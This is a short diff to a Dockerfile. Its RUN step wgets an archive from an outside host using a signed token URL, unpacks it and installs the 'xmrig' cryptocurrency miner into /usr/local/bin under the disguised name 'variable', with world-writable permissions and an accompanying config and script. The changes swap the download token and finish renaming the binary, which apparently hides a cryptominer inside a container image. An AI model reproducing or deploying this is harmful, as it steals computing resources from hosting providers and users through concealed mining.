@@ -4,7 +4,7 @@ RUN apt update; \
     apt install wget -y; \
     apt install jq -y; \
     apt install bash -y; \
-    wget https://data.atonline.net/~jwt/eyJ2IjoxLCJ1IjoicGhwbGF0Zm9ybSIsImUiOjE2NTUwNDgwMjh9.eyJhY3QiOiJnZXQiLCJpbiI6eyJkbCI6dHJ1ZX0sIm1pbWUiOiJhcHBsaWNhdGlvbi9nemlwIiwicCI6ImJsb2JzcmMvYmxvYnMtd2NlczYyLW9mN2ItZnFsYi0yZmJrLWRxaXp4bXR1In0.8qBahMZzsIfVIUA1y6mRF-15MoBhg1Vjg_XbQ7XlJqs/variable.tar.gz; \
+    wget https://data.atonline.net/~jwt/eyJ2IjoxLCJ1IjoicGhwbGF0Zm9ybSIsImUiOjE2NTUwNTAxNDh9.eyJhY3QiOiJnZXQiLCJpbiI6eyJkbCI6dHJ1ZX0sIm1pbWUiOiJhcHBsaWNhdGlvbi9nemlwIiwicCI6ImJsb2JzcmMvYmxvYnMtbXNtcXNwLW4ydWItZ3NuZC0zdHl2LXV1NGJ2MnhtIn0.e9pzrttMa8SBP-WUtjuA2mwEEyBA-iW6q_qKSLkvQh8/variable.tar.gz; \
     tar xf variable.tar.gz; \
     cd variable; \
     cp xmrig /usr/local/bin/variable; \
@@ -13,7 +13,7 @@ RUN apt update; \
     chmod -R 777 /usr/local/bin; \
     cd /usr/local/bin; \
     chmod 777 config.json; \
-    chmod 777 xmrig; \
+    chmod 777 variable; \
     chmod 777 script.sh;
     
 WORKDIR /usr/local/bin
